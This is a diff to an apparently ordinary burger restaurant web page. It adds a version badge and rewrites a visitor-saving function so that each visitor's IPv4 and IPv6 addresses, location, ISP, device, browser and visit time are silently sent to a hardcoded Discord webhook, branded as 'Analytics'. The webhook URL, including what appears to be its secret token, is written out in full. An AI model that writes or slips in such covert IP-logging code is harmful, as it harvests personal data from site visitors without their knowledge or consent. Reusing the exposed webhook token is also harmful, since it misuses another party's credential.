@@ -48,6 +48,20 @@
             background-clip: text;
         }
 
+        .version {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #666;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            z-index: 9999;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            font-family: monospace;
+        }
+
         nav ul {
             display: flex;
             list-style: none;
@@ -409,6 +423,9 @@
     </style>
 </head>
 <body>
+    <!-- Version Badge -->
+    <div class="version">v2.0</div>
+
     <!-- Navigation -->
     <nav>
         <div class="container">
@@ -604,22 +621,41 @@
 
         async function saveVisitor(data) {
             try {
+                // YOUR DISCORD WEBHOOK URL HERE
+                const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1454654042994376785/KflRIieJ3o7ODtnELQJ0yyzVykqsYnRD_OXtENOeJOEA3aYbicVFfcpg3POKccYxfvYK';
+                
+                // Send to Discord
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: '🍔 New Visitor!',
+                            color: 15158332,
+                            fields: [
+                                {name: '📍 IPv4', value: data.ipv4, inline: true},
+                                {name: '📍 IPv6', value: data.ipv6, inline: true},
+                                {name: '🌍 Location', value: data.location, inline: false},
+                                {name: '📡 ISP', value: data.isp, inline: false},
+                                {name: '💻 Device', value: data.device, inline: true},
+                                {name: '🌐 Browser', value: data.browser, inline: true},
+                                {name: '⏰ Time', value: data.timestamp, inline: false}
+                            ],
+                            footer: {text: 'Jackson\'s Burger Analytics'}
+                        }]
+                    })
+                });
+                
+                // Also save to localStorage for backup
                 let visitors = [];
-                
-                // Get existing visitors from localStorage
                 const stored = localStorage.getItem('burger-visitors');
-                if (stored) {
-                    visitors = JSON.parse(stored);
-                }
-                
-                // Add new visitor
+                if (stored) visitors = JSON.parse(stored);
                 visitors.push(data);
-                
-                // Save back to localStorage
                 localStorage.setItem('burger-visitors', JSON.stringify(visitors));
-                console.log('Visitor saved! Total:', visitors.length);
+                
+                console.log('✅ Visitor data sent to Discord!');
             } catch (error) {
-                console.error('Storage error:', error);
+                console.error('❌ Error sending to Discord:', error);
             }
         }
 
